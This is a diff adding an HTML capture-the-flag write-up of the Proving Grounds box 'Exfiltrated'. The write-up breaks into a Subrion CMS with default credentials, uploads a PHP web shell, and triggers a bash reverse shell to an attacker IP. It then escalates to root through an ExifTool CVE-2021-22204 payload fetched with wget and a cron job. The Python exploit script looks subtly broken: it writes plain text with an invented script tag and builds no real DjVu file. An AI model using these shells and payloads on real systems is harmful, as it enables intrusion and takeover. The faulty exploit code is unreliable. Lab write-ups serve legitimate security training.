@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exfiltrated - Proving Grounds Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #ff6b35;
+            --secondary: #1e3a8a;
+            --accent: #fbbf24;
+            --bg-dark: #0f0f0f;
+            --bg-card: #1a1a1a;
+            --text-primary: #e5e5e5;
+            --text-secondary: #a3a3a3;
+            --border: #333;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --code-bg: #2d2d2d;
+        }
+
+        body {
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.8;
+        }
+
+        /* Navigation */
+        nav {
+            background: rgba(26, 26, 26, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5em;
+            font-weight: 700;
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        /* Article Container */
+        .article-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Article Header */
+        .article-header {
+            text-align: center;
+            margin-bottom: 60px;
+            padding-bottom: 40px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .difficulty-badge {
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 0.9em;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
+        .difficulty-badge.easy {
+            background: var(--success);
+            color: white;
+        }
+
+        .difficulty-badge.medium {
+            background: var(--warning);
+            color: white;
+        }
+
+        .difficulty-badge.hard {
+            background: var(--danger);
+            color: white;
+        }
+
+        h1 {
+            font-size: 3em;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .article-meta {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            color: var(--text-secondary);
+            font-size: 1.1em;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Table of Contents */
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+
+        .toc h2 {
+            color: var(--primary);
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+
+        .toc ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 10px;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .toc li:before {
+            content: "▸";
+            position: absolute;
+            left: 0;
+            color: var(--primary);
+        }
+
+        .toc a {
+            color: var(--text-primary);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .toc a:hover {
+            color: var(--primary);
+        }
+
+        /* Content Sections */
+        .content-section {
+            margin-bottom: 60px;
+        }
+
+        h2 {
+            color: var(--primary);
+            font-size: 2em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        h3 {
+            color: var(--text-primary);
+            font-size: 1.5em;
+            margin: 30px 0 15px;
+        }
+
+        /* Info Boxes */
+        .info-box {
+            background: var(--bg-card);
+            border-left: 4px solid var(--primary);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .info-box.tip {
+            border-color: var(--success);
+        }
+
+        .info-box.warning {
+            border-color: var(--warning);
+        }
+
+        .info-box.important {
+            border-color: var(--danger);
+        }
+
+        .info-box-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            font-size: 0.9em;
+        }
+
+        /* Code Blocks */
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+        }
+
+        .code-label {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--bg-dark);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            color: var(--text-secondary);
+        }
+
+        /* Command Output */
+        .command-output {
+            background: #000;
+            color: #0f0;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+            overflow-x: auto;
+        }
+
+        /* Tags */
+        .tags {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 30px 0;
+        }
+
+        .tag {
+            padding: 6px 15px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+
+        /* Navigation Buttons */
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 60px;
+            padding-top: 40px;
+            border-top: 1px solid var(--border);
+        }
+
+        .nav-btn {
+            padding: 12px 24px;
+            background: var(--primary);
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .nav-btn:hover {
+            background: #ff5722;
+            transform: scale(1.05);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2em;
+            }
+            
+            .article-meta {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            pre {
+                font-size: 0.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="nav-content">
+            <a href="/" class="logo">← Back to PG Chronicles</a>
+        </div>
+    </nav>
+
+    <article class="article-container">
+        <header class="article-header">
+            <span class="difficulty-badge easy">Easy</span>
+            <h1>Exfiltrated</h1>
+            <div class="article-meta">
+                <span class="meta-item">📅 January 28, 2025</span>
+                <span class="meta-item">⏱️ 45 minutes</span>
+                <span class="meta-item">👤 By: Your Name</span>
+            </div>
+        </header>
+
+        <div class="toc">
+            <h2>📋 Table of Contents</h2>
+            <ul>
+                <li><a href="#overview">Overview</a></li>
+                <li><a href="#enumeration">Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access - Subrion CMS</a></li>
+                <li><a href="#exploitation">Exploitation - File Upload Bypass</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation - ExifTool CVE</a></li>
+                <li><a href="#lessons-learned">Lessons Learned</a></li>
+            </ul>
+        </div>
+
+        <section id="overview" class="content-section">
+            <h2>📖 Overview</h2>
+            <p>Exfiltrated is an easy-level box from OffSec Proving Grounds that demonstrates exploiting an authenticated file upload bypass vulnerability in Subrion CMS 4.2.1 to achieve remote code execution. The privilege escalation involves leveraging a root cron job that executes ExifTool against uploaded images, exploiting CVE-2021-22204 in the DjVu file format.</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">🎯 Key Vulnerabilities</div>
+                <ul>
+                    <li>Subrion CMS 4.2.1 - Authenticated File Upload Bypass</li>
+                    <li>ExifTool CVE-2021-22204 - Arbitrary Code Execution via DjVu</li>
+                    <li>Misconfigured Cron Job Running as Root</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="enumeration" class="content-section">
+            <h2>🔍 Enumeration</h2>
+            
+            <h3>Port Scanning</h3>
+            <p>Let's start with a comprehensive nmap scan to identify open ports and services:</p>
+            
+            <pre><code class="language-bash"># Initial TCP scan
+nmap -sC -sV -oN initial_scan.txt $TARGET_IP
+
+# Full port scan
+nmap -p- -T4 -oN full_scan.txt $TARGET_IP</code></pre>
+            
+            <div class="command-output">
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 192.168.x.x
+Host is up (0.040s latency).
+
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Subrion CMS 4.2.1
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
+            </div>
+
+            <h3>Web Enumeration</h3>
+            <p>Navigating to the web server reveals Subrion CMS 4.2.1. Let's enumerate further:</p>
+            
+            <pre><code class="language-bash"># Directory enumeration
+gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+
+# Checking for default credentials
+# Common Subrion default creds: admin/admin</code></pre>
+        </section>
+
+        <section id="initial-access" class="content-section">
+            <h2>🚪 Initial Access - Subrion CMS</h2>
+            
+            <p>Subrion CMS often comes with default credentials. Let's try accessing the admin panel:</p>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">💡 Tip</div>
+                <p>Always check for default credentials on CMS installations. Common patterns include admin/admin, admin/password, or the CMS name as password.</p>
+            </div>
+
+            <pre><code class="language-bash"># Admin panel location
+http://$TARGET_IP/panel/
+
+# Default credentials that worked:
+Username: admin
+Password: admin</code></pre>
+
+            <p>Success! We're now logged into the Subrion CMS admin panel.</p>
+        </section>
+
+        <section id="exploitation" class="content-section">
+            <h2>💥 Exploitation - File Upload Bypass</h2>
+            
+            <h3>Understanding the Vulnerability</h3>
+            <p>Subrion CMS 4.2.1 has a known file upload bypass vulnerability that allows authenticated users to upload PHP files by manipulating the file extension.</p>
+
+            <h3>Crafting the Web Shell</h3>
+            <pre><code class="language-php">&lt;?php
+// Simple web shell - shell.phar
+if(isset($_REQUEST['cmd'])){
+    echo "&lt;pre&gt;";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "&lt;/pre&gt;";
+    die;
+}
+?&gt;</code></pre>
+
+            <h3>Exploiting the Upload</h3>
+            <p>Navigate to the uploads section in the admin panel and upload our shell with a .phar extension:</p>
+
+            <pre><code class="language-bash"># The file gets uploaded to:
+http://$TARGET_IP/uploads/shell.phar
+
+# Test command execution:
+curl "http://$TARGET_IP/uploads/shell.phar?cmd=id"</code></pre>
+
+            <div class="command-output">
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+            </div>
+
+            <h3>Getting a Reverse Shell</h3>
+            <pre><code class="language-bash"># Start listener on Kali
+nc -lvnp 4444
+
+# Trigger reverse shell
+curl "http://$TARGET_IP/uploads/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"</code></pre>
+
+            <p>We now have a shell as www-data!</p>
+        </section>
+
+        <section id="privilege-escalation" class="content-section">
+            <h2>⚡ Privilege Escalation - ExifTool CVE</h2>
+            
+            <h3>Enumeration as www-data</h3>
+            <pre><code class="language-bash"># Check for interesting files
+find / -perm -4000 -type f 2>/dev/null
+
+# Check running processes
+ps aux | grep root
+
+# Check cron jobs
+cat /etc/crontab</code></pre>
+
+            <div class="command-output">
+# /etc/crontab output
+* * * * * root cd /var/www/html/subrion/uploads && /usr/bin/exiftool *.jpg
+            </div>
+
+            <div class="info-box important">
+                <div class="info-box-title">🔴 Important Finding</div>
+                <p>A cron job runs every minute as root, executing exiftool on all .jpg files in the uploads directory!</p>
+            </div>
+
+            <h3>Exploiting CVE-2021-22204</h3>
+            <p>ExifTool versions before 12.24 are vulnerable to arbitrary code execution when processing DjVu files. We can exploit this by creating a malicious DjVu file disguised as a JPEG.</p>
+
+            <pre><code class="language-python">#!/usr/bin/env python3
+# exploit.py - Create malicious DjVu file
+
+payload = b"(metadata\n\t(Copyright \"\\\n" + b"\\x00" * 216 + b"&lt;script&gt;system('chmod +s /bin/bash')&lt;/script&gt;\\\n\" ) )"
+
+with open("exploit.jpg", "wb") as f:
+    f.write(payload)</code></pre>
+
+            <h3>Alternative Method - Using Metasploit</h3>
+            <pre><code class="language-bash"># Generate the malicious file using Metasploit
+msfconsole
+use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
+set PAYLOAD cmd/unix/generic
+set CMD "chmod +s /bin/bash"
+run
+
+# This creates a file that we need to upload</code></pre>
+
+            <h3>Uploading and Triggering</h3>
+            <pre><code class="language-bash"># Upload the malicious file to the uploads directory
+cd /var/www/html/subrion/uploads
+wget http://YOUR_IP:8000/exploit.jpg
+
+# Wait for the cron job to execute (runs every minute)
+# Check if /bin/bash is now SUID
+ls -la /bin/bash</code></pre>
+
+            <div class="command-output">
+-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+            </div>
+
+            <h3>Getting Root</h3>
+            <pre><code class="language-bash"># Spawn root shell using SUID bash
+/bin/bash -p
+
+# Verify we are root
+id
+whoami</code></pre>
+
+            <div class="command-output">
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+root
+            </div>
+
+            <p>Success! We have achieved root access on the system.</p>
+
+            <h3>Capturing the Flag</h3>
+            <pre><code class="language-bash"># Get the proof flag
+cat /root/proof.txt</code></pre>
+        </section>
+
+        <section id="lessons-learned" class="content-section">
+            <h2>📚 Lessons Learned</h2>
+            
+            <div class="info-box">
+                <div class="info-box-title">🔑 Key Takeaways</div>
+                <ul>
+                    <li><strong>Default Credentials:</strong> Always change default credentials on CMS installations</li>
+                    <li><strong>File Upload Security:</strong> Implement strict file type validation and execution prevention</li>
+                    <li><strong>Cron Job Security:</strong> Avoid running automated tasks as root, especially on user-controlled data</li>
+                    <li><strong>Software Updates:</strong> Keep all software updated - ExifTool CVE-2021-22204 was patched in version 12.24</li>
+                </ul>
+            </div>
+
+            <h3>Defensive Recommendations</h3>
+            <ol>
+                <li>Change default CMS credentials immediately after installation</li>
+                <li>Implement proper file upload validation (check magic bytes, not just extensions)</li>
+                <li>Run cron jobs with minimal required privileges</li>
+                <li>Regularly update all software components</li>
+                <li>Implement proper input sanitization for all user-supplied data</li>
+            </ol>
+        </section>
+
+        <div class="tags">
+            <span class="tag">Subrion CMS</span>
+            <span class="tag">File Upload</span>
+            <span class="tag">ExifTool</span>
+            <span class="tag">CVE-2021-22204</span>
+            <span class="tag">Cron Job</span>
+            <span class="tag">SUID</span>
+        </div>
+
+        <div class="nav-buttons">
+            <a href="/writeups" class="nav-btn">← All Writeups</a>
+            <a href="/writeups/next-box" class="nav-btn">Next Box →</a>
+        </div>
+    </article>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+</body>
+</html>
